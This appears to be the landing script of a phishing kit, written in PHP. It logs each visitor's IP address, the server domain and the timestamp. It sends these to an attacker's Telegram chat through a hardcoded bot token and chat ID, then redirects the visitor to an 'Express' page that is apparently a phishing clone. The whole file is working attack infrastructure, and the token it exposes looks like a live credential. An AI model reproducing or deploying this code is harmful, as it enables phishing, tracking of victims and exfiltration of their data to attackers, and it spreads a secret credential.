<?php
session_start();
error_reporting(0);
include 'get_ip.php'; 
$ip = $_SERVER['REMOTE_ADDR'];
$TIME_DATE =   date("Y/m/d") . " " . date("h:i:sa");
//------------------------------------------||  ANTIBOTS  ||-----------------------------------------------------//

$cc = "DOMAIN : ".$_SERVER['SERVER_NAME']."\nIP :http://www.geoiptool.com/?IP=".$ip."\nTIME : ".$TIME_DATE;


function Vist($cc) {
	
    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot5905195547:AAFeIDrTJ9xRltJEQyY7bARGE2oQ2kNdwoM/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=-874388031&text=🎯3baba<3\n".$cc."");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close ($ch);

}

Vist($cc);
//---------------------------------------------------------------------------------------------------------------//

//LOCATION !
/* This will give an error. Note the output
 * above, which is before the header() call */
header('Location: Express/index.php');
?>